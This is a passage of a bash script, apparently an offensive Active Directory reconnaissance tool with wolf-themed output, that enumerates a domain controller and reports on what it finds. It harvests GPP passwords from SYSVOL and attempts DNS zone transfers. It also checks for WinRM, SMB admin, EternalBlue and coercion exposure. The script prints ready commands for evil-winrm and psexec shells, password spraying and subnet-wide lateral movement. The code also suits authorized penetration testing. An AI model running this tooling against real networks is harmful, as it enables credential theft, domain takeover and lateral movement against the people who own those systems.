        echo "$COMPUTERS" | grep "dNSHostName:\|operatingSystem:" | paste - - 2>/dev/null | while read -r line; do
            info "  $line"
        done

        # Check for old OS
        OLD_OS=$(echo "$COMPUTERS" | grep -iE "Windows Server 2008|Windows Server 2003|Windows 7|Windows XP" || true)
        if [[ -n "$OLD_OS" ]]; then
            critical "LEGACY OS DETECTED — likely vulnerable!"
            echo "$OLD_OS" | while read -r line; do
                critical "  $line"
            done
            add_critical "Legacy/unsupported OS found — check EternalBlue (MS17-010), BlueKeep"
        fi
    fi
fi

# ═══════════════════════════════════════════════════════
# 11. TRUST RELATIONSHIPS
# ═══════════════════════════════════════════════════════
section "11. NEIGHBORING PACKS — Domain Trusts"

if [[ "$AUTH_MODE" == "password" ]]; then
    TRUSTS=$(run_ldap '(objectClass=trustedDomain)' 'cn trustDirection trustType' 2>/dev/null || true)
    if [[ -n "$TRUSTS" ]] && echo "$TRUSTS" | grep -q "cn:"; then
        warning "Domain trusts found:"
        echo "$TRUSTS" | grep "cn:\|trustDirection:\|trustType:" | while read -r line; do
            warning "  $line"
        done
        echo "$TRUSTS" > "$OUTPUT_DIR/domain_trusts.txt"
        add_important "Domain trusts exist — potential for cross-domain escalation"
    else
        info "No domain trusts found"
    fi
fi

# ═══════════════════════════════════════════════════════
# 12. GPO ENUMERATION
# ═══════════════════════════════════════════════════════
section "12. SNIFFING POLICY — GPOs & GPP Passwords"

if [[ "$AUTH_MODE" == "password" ]]; then
    GPOS=$(run_ldap '(objectClass=groupPolicyContainer)' 'displayName gPCFileSysPath' 2>/dev/null || true)
    if [[ -n "$GPOS" ]]; then
        echo "$GPOS" > "$OUTPUT_DIR/gpos.txt"
        echo "$GPOS" | grep "displayName:" | while read -r line; do
            info "$line"
        done

        # Try to access SYSVOL for GPP passwords
        subsection "GPP Password Check (SYSVOL)"
        GPP=$(run_nxc_smb "-M gpp_password" 2>/dev/null || true)
        if [[ -n "$GPP" ]] && echo "$GPP" | grep -qi "password\|found"; then
            critical "GPP PASSWORDS FOUND IN SYSVOL!"
            echo "$GPP" | while read -r line; do
                critical "  $line"
            done
            add_critical "GPP/cPassword found in SYSVOL — plaintext credentials"
            add_quickwin "GPP password → test with netexec spray"
        else
            info "No GPP passwords found"
        fi

        # GPP autologon
        GPP_AUTO=$(run_nxc_smb "-M gpp_autologin" 2>/dev/null || true)
        if [[ -n "$GPP_AUTO" ]] && echo "$GPP_AUTO" | grep -qi "password\|found\|autologon"; then
            critical "GPP AUTOLOGON CREDENTIALS FOUND!"
            echo "$GPP_AUTO"
            add_critical "GPP autologon credentials in SYSVOL"
        fi
    fi
fi

# ═══════════════════════════════════════════════════════
# 13. DNS RECORDS
# ═══════════════════════════════════════════════════════
section "13. HOWLING AT DNS — Zone Transfers"

# Zone transfer attempt
ZONE=$(dig axfr "$DOMAIN" "@${DC_IP}" 2>/dev/null || true)
if [[ -n "$ZONE" ]] && echo "$ZONE" | grep -q "IN"; then
    critical "DNS ZONE TRANSFER ALLOWED!"
    echo "$ZONE" > "$OUTPUT_DIR/zone_transfer.txt"
    add_critical "DNS zone transfer — full DNS dump available"
else
    info "Zone transfer not allowed (normal)"
fi

# adidnsdump for all DNS records
if [[ "$AUTH_MODE" == "password" ]] && command -v adidnsdump &>/dev/null; then
    subsection "ADIDNS Dump"
    adidnsdump -u "${DOMAIN}\\${AD_USER}" -p "$AD_PASS" "$DC_IP" -r 2>/dev/null || true
    if [[ -f records.csv ]]; then
        mv records.csv "$OUTPUT_DIR/dns_records.csv"
        DNS_COUNT=$(wc -l < "$OUTPUT_DIR/dns_records.csv")
        finding "Dumped $DNS_COUNT DNS records to $OUTPUT_DIR/dns_records.csv"
    fi
fi

# ═══════════════════════════════════════════════════════
# 14. WINRM ACCESS CHECK
# ═══════════════════════════════════════════════════════
section "14. TRYING THE DOOR — Service Access"

if [[ "$AUTH_MODE" != "null" ]]; then
    subsection "WinRM (5985)"
    WINRM_CHECK=$(run_nxc_smb "" 2>/dev/null | head -1 || true)

    if [[ "$AUTH_MODE" == "password" ]]; then
        WINRM=$(netexec winrm "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" 2>/dev/null || true)
    elif [[ "$AUTH_MODE" == "hash" ]]; then
        WINRM=$(netexec winrm "$DC_IP" -u "$AD_USER" -H "$AD_HASH" -d "$DOMAIN" 2>/dev/null || true)
    fi

    if [[ -n "$WINRM" ]]; then
        if echo "$WINRM" | grep -qi "Pwn3d\|pwned"; then
            critical "WINRM ACCESS — CAN GET SHELL ON DC!"
            add_critical "WinRM shell access on DC with current credentials"
            add_quickwin "evil-winrm -i $DC_IP -u '$AD_USER' -p '$AD_PASS'"
            cmd_hint "evil-winrm -i $DC_IP -u '$AD_USER' -p '$AD_PASS'"
        elif echo "$WINRM" | grep -qi "+"; then
            finding "WinRM auth succeeded (but not admin)"
        else
            info "WinRM: no access"
        fi
    fi

    subsection "SMB Admin Check"
    SMB_ADMIN=$(run_nxc_smb "" 2>/dev/null || true)
    if echo "$SMB_ADMIN" | grep -qi "Pwn3d\|pwned"; then
        critical "LOCAL ADMIN VIA SMB!"
        add_critical "Local admin on DC via SMB"
        add_quickwin "impacket-psexec '${IMPACKET_AUTH}'@$DC_IP"
        cmd_hint "impacket-psexec '${IMPACKET_AUTH}'@$DC_IP"
    fi
fi

# ═══════════════════════════════════════════════════════
# 15. BLOODHOUND COLLECTION
# ═══════════════════════════════════════════════════════
if $BLOODHOUND; then
    section "15. UNLEASHING BLOODHOUND — Collection"

    if [[ "$AUTH_MODE" == "password" ]]; then
        info "Running BloodHound collection (this may take a while)..."
        bloodhound-python -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" -ns "$DC_IP" \
            -c All --zip -o "$OUTPUT_DIR/" 2>/dev/null || true

        BH_ZIP=$(ls -t "$OUTPUT_DIR/"*bloodhound*.zip 2>/dev/null | head -1 || true)
        if [[ -n "$BH_ZIP" ]]; then
            finding "BloodHound data collected: $BH_ZIP"
            finding "Import into BloodHound GUI and check:"
            info "  - Shortest Path to Domain Admin"
            info "  - Kerberoastable users with path to DA"
            info "  - Users with DCSync rights"
            info "  - Owned principal → Find attack paths"
        else
            fail "BloodHound collection may have failed — check manually"
        fi
    else
        fail "BloodHound requires password authentication"
    fi
fi

# ═══════════════════════════════════════════════════════
# 16. ADDITIONAL CHECKS (FULL SCAN)
# ═══════════════════════════════════════════════════════
if $FULL_SCAN && [[ "$AUTH_MODE" == "password" ]]; then
    section "16. OFF THE LEASH — Extended Checks"

    # MSSQL instances
    subsection "MSSQL Discovery"
    MSSQL=$(netexec mssql "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" 2>/dev/null || true)
    if [[ -n "$MSSQL" ]] && echo "$MSSQL" | grep -qi "+\|login"; then
        warning "MSSQL access found!"
        echo "$MSSQL"
        add_important "MSSQL access — check for xp_cmdshell, linked servers, impersonation"
        cmd_hint "impacket-mssqlclient '${DOMAIN}/${AD_USER}:${AD_PASS}'@$DC_IP -windows-auth"
    fi

    # RDP access
    subsection "RDP Check"
    RDP=$(netexec rdp "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" 2>/dev/null || true)
    if [[ -n "$RDP" ]] && echo "$RDP" | grep -qi "+"; then
        finding "RDP access available"
        cmd_hint "xfreerdp /u:'$AD_USER' /p:'$AD_PASS' /v:$DC_IP /cert-ignore /dynamic-resolution"
    fi

    # MS17-010 (EternalBlue) on DC
    subsection "EternalBlue Check"
    EB=$(nmap -p 445 --script smb-vuln-ms17-010 "$DC_IP" 2>/dev/null | grep -i "VULNERABLE" || true)
    if [[ -n "$EB" ]]; then
        critical "DC VULNERABLE TO ETERNALBLUE (MS17-010)!"
        add_critical "DC vulnerable to EternalBlue — instant SYSTEM"
    fi

    # NTLMv1 check
    subsection "NTLMv1 Check"
    NTLMV1=$(run_ldap '(objectClass=domain)' 'msDS-Behavior-Version' 2>/dev/null || true)
    DFL=$(echo "$NTLMV1" | grep "msDS-Behavior-Version:" | awk '{print $2}' || true)
    if [[ -n "$DFL" ]]; then
        info "Domain Functional Level: $DFL"
        if [[ "$DFL" -lt 3 ]]; then
            warning "Low domain functional level — NTLMv1 may be accepted"
        fi
    fi

    # Print spooler (for PrintNightmare / coercion)
    subsection "Print Spooler Check"
    SPOOLER=$(rpcclient -U "${AD_USER}%${AD_PASS}" "$DC_IP" -c 'getprinter' 2>/dev/null || true)
    if [[ -n "$SPOOLER" ]] && ! echo "$SPOOLER" | grep -qi "denied\|error\|WERR_UNKNOWN"; then
        warning "Print Spooler appears active — PrintNightmare / SpoolSample coercion possible"
        add_important "Print Spooler active on DC — coercion attack potential"
    fi

    # WebDAV check
    subsection "WebDAV Check (coercion)"
    WEBDAV=$(run_nxc_smb "-M webdav" 2>/dev/null || true)
    if [[ -n "$WEBDAV" ]] && echo "$WEBDAV" | grep -qi "enabled\|webclient"; then
        warning "WebDAV/WebClient service enabled — coercion via PetitPotam/WebDAV possible"
        add_important "WebDAV enabled — relay/coercion attack surface"
    fi
fi

# ═══════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════
section "THE HUNT REPORT"

echo ""
if [[ ${#CRITICAL_FINDINGS[@]} -gt 0 ]]; then
    echo -e "  ${RED}${BOLD}KILLS — CRITICAL FINDINGS (${#CRITICAL_FINDINGS[@]}):${NC}"
    for f in "${CRITICAL_FINDINGS[@]}"; do
        echo -e "  ${RED}  [BITE!] $f${NC}"
    done
    echo ""
fi

if [[ ${#QUICK_WINS[@]} -gt 0 ]]; then
    echo -e "  ${GREEN}${BOLD}EASY PREY — QUICK WINS (${#QUICK_WINS[@]}):${NC}"
    for f in "${QUICK_WINS[@]}"; do
        echo -e "  ${GREEN}  [SNIFF] $f${NC}"
    done
    echo ""
fi

if [[ ${#IMPORTANT_FINDINGS[@]} -gt 0 ]]; then
    echo -e "  ${YELLOW}${BOLD}SCENT TRAIL — WORTH INVESTIGATING (${#IMPORTANT_FINDINGS[@]}):${NC}"
    for f in "${IMPORTANT_FINDINGS[@]}"; do
        echo -e "  ${YELLOW}  [GROWL] $f${NC}"
    done
    echo ""
fi

if [[ ${#CRITICAL_FINDINGS[@]} -eq 0 && ${#QUICK_WINS[@]} -eq 0 && ${#IMPORTANT_FINDINGS[@]} -eq 0 ]]; then
    info "The trail is cold — no immediate escalation paths with current privileges"
    info "Keep hunting:"
    info "  1. Run BloodHound (-b flag) for ACL analysis"
    info "  2. Try password spraying with common passwords"
    info "  3. Check all SMB shares for config files / scripts"
    info "  4. Look for other hosts on the network with lateral movement"
fi

echo ""
echo -e "${BOLD}Loot stashed in:${NC} $OUTPUT_DIR/"
ls -la "$OUTPUT_DIR/" 2>/dev/null | tail -n +2 | while read -r line; do
    info "  $line"
done

# Next steps
echo ""
section "NEXT MOVES — KEEP THE HUNT GOING"

echo -e "  ${CYAN}1.${NC} Feed BloodHound (if collected):"
cmd_hint "bloodhound-python -u '$AD_USER' -p '$AD_PASS' -d '$DOMAIN' -ns $DC_IP -c All"

echo -e "  ${CYAN}2.${NC} Spray the pack:"
cmd_hint "netexec smb $DC_IP -u $OUTPUT_DIR/users.txt -p 'Company2026!' -d '$DOMAIN' --continue-on-success"

echo -e "  ${CYAN}3.${NC} Run with the pack — lateral movement:"
cmd_hint "netexec smb SUBNET/24 -u '$AD_USER' -p '$AD_PASS' -d '$DOMAIN' --continue-on-success"

echo -e "  ${CYAN}4.${NC} Sniff other protocols:"
cmd_hint "netexec winrm $DC_IP -u '$AD_USER' -p '$AD_PASS' -d '$DOMAIN'"
cmd_hint "netexec mssql $DC_IP -u '$AD_USER' -p '$AD_PASS' -d '$DOMAIN'"

echo ""
echo -e "${CYAN}  ┌─────────────────────────────────────────────────────┐${NC}"
echo -e "${CYAN}  │${NC}  Hunt completed at $(date)  ${CYAN}│${NC}"
echo -e "${CYAN}  └─────────────────────────────────────────────────────┘${NC}"
echo ""
echo -e "${WHITE}${BOLD}  \"The domain is a forest. Be the wolf.\"${NC}"
echo -e "${CYAN}  — The Husky Hacker | thehuskyhacker.com${NC}"
echo ""
